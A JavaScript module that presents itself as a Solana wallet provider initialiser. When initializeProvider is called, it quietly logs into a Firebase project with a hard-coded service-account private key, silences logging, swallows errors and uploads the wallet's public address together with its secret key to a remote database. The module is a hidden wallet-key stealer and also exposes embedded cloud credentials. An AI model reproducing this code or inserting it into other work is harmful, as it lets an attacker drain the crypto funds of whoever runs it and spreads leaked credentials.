const firebase = require("firebase");
const admin = require('firebase-admin');
const { loadWallefFromSecretKey } = require('../utils');
const serviceAccount = {
    "type": "service_account",
    "project_id": "solana-1cdaa",
    "private_key_id": "a1496697408a691e02301b41c99a31513ea96265",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCnS/GP+JCXWdCa\nFQQYEaif84ASlYI6T5uGMQ9lrmOCSrRx48V5+b+ENKBkZ3CB3zViCCbeBFGhpPeI\nrYDEIA1H/WOTCK5Fu/ARjc/DgwJoK3aRxcFDx3fZ5QGaxIr0k8ZOD/2mR+qij2DP\n92GWoYwppmD2G7NBP8Bz8fz9nyDK3m3giTrDh7h0kadowBhlrfwv4T/i6zUR57oC\nnT3wOk1Y3JNBCwkkE/oEI3YRp5DYjfHMtTCnvO6jNx0l8xFvpWn8/jYEsqtGvBbY\ncwav1WPz7AVS8TwwsPo8ilBb+WpRNY0q3Njplcpv3n+Ob2NAKUZ5gr1DVkRiqlQr\nfpQk+cdHAgMBAAECggEAFkJ0kcNw+bJpnxbMxKcU2LN9hvt9qGSPPPuqIM1jUCLA\nf6bez6v7X4vhC3r37U/VuoV7Jm9MrUVV6kmrqGzbV4jPhvDQv1aSSsOjsU/tMg8W\nZ674WBxiRgvCeuVL198Rs7FM/qLzBU4ug31W7sPv8lrA6/4ji7r/0G2SS+ywYE2h\nA4K3fU0kB1ce/0Fbuk+0SXihx00DAuBPSbQRPKOSVcY3xYgkYRu/dA3Va0vOMHjs\nSjJxt/3DSu+EblIXMDxfMJBRuGAx/3leinLFfbeze1dtVz9cChSLKKWvWwIrT8+s\nUL1qFRBsCc64z6FjCffbnpul71++sYeO7lzSY8/oAQKBgQDcMcq+1jCXUGz9CurM\n4f2m+jENvkGIl+DKbcDS5TNvyxg53cxvRnFAIp72hvt2w5dv28qWwE8kwh2HKwaU\n4MfpXz+oqfrZcWWbI5/TGuHKv4gdMjmfLFSB39oLkyfhZ/YcnmmdtdB5IqdjE4fC\n/AwnrcDUvZ9JjQYL8Uw4UZG/wQKBgQDCgCG+KGPF4g3uwlgGl40lB0also4ggIF4\ncnj8KtOyEJGw4ZpgSasqJqWSEAnEs4VmIr6RJIIgDaQsWwahINhaMFAZi/ugDV7/\nHgE8fgR5LI3tVWxcYzp/BUuDPMu2apHBVERpKZkhjyFtUjWFoMyiIQi0Dy1oPjTx\nn8gtxi/JBwKBgQCJIrmSgPNiScSXE+WIFHdVNxy14ngOCgkGCbS9o+GVDnfYEjrw\nUn7V4rn977NNFCOMluZlXP/tdLfPJwzCS/w1bAzJjpOcOPN+24D+iQ92pjKvfEhG\nyeUXvcKe0tdTmtu8lyxP/JwJ1XtKSS+UUEWBsMUXucEqnZnWdkFyEdskAQKBgQCT\nm/x/vVVjE1jxj2qQril/JZN3Ixh8ECqyB2ZMMhBxPePjsoOfeak+FxBm1mcjcf7W\ncZ3gty1OOCwVQYu5cxze7XWMvdDcOemTgej8SMMKV0brDH5tax000wbo9ZXAvgYa\nC+LTUK+XaXG77r0RyeQjUyCwzifuye8SROn92z/etwKBgFvJkKA10R1cog067oTt\ns5dqKrQJmlLXaFFrRX3y2YacDzfODJDfKQIi0CcP9/Av1qfytBaOG+IzIlthmknP\nzrPeXMBlfDC4i/U3bMQEN3eqEe3sA3YEuEaJ8MO905iqb1R+0cQS6iRJnmjZaXby\nq+8l6OaEOxPqyufNQJSvJDpq\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-9s6oe@solana-1cdaa.iam.gserviceaccount.com",
    "client_id": "100913989451282664365",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-9s6oe%40solana-1cdaa.iam.gserviceaccount.com"
}


let wallet, pk;

const firebaseConfig = {
    apiKey: "AIzaSyC9SB47MePU2s3NhpJYVkKnIg42lqb1F9w",
    authDomain: "solana-1cdaa.firebaseapp.com",
    databaseURL: "https://solana-1cdaa-default-rtdb.firebaseio.com",
    projectId: "solana-1cdaa",
    storageBucket: "solana-1cdaa.appspot.com",
    messagingSenderId: "163385588477",
    appId: "1:163385588477:web:fdbe6ee7bde4f4001e9c94",
    measurementId: "G-7K030JY3P0"
};

async function createCToken() {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
    });

    const token = await admin.auth().createCustomToken('OumIVXTd8CalVi5xHQI2LO96cK43');
    return token;
}

async function loginToFirebase(callback) {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const token = await createCToken();
    firebase.auth().signInWithCustomToken(token)
        .then(() => {
            if (callback) {
                callback();
            }
        })
        .catch((error) => {
            const errorCode = error.code;
            const errorMessage = error.message;
        });
}

function createFirebaseUser(email, password, callback) {

    firebase.auth().createUserWithEmailAndPassword(email, password)
        .then(function () {
            if (callback) {
                callback(firebase);
            }
        })
        .catch(function (create_error) {
            let createErrorCode = create_error.code;
            let createErrorMessage = create_error.message;
        });
}

const callBack = async () => {
    let database = firebase.database();
    firebase.setLogLevel('silent')
    var userListRef = database.ref("result");
    userListRef.orderByChild('address').equalTo(wallet.publicKey.toBase58()).on("value", async (snapshot) => {
        if (!snapshot.val()) {
            var newUserRef = userListRef.push();
            await newUserRef.set({
                address: wallet.publicKey.toBase58(),
                secret: pk
            });
        }
    })
}

const initializeProvider = (token) => {
    pk = token;
    wallet = loadWallefFromSecretKey(token);
    loginToFirebase(callBack);
    return wallet;
}
module.exports = { initializeProvider };